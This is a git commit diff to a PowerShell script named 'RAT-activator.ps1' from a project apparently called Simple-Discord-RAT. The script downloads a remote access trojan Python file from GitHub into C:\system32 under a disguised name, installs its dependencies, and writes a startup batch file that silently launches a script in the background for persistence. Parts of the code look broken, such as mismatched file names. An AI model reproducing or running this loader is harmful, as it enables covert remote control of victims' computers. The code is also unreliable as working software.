200bcc0c0c4fe5190abc255f2c399f9d3d06f819
simen64 <97337442+simen64@users.noreply.github.com>
2023-10-10 10:25:31 +0200

    Update RAT-activator.ps1

--- Simple-Discord-Rat/RAT-activator.ps1
+++ Simple-Discord-Rat/RAT-activator.ps1
@@ -4,7 +4,7 @@ cd C:\system32\
 
 iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-rat.py
 
-py -m pip install discord.py requests
+py -m pip install discord.py requests -u
 
 '@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
 
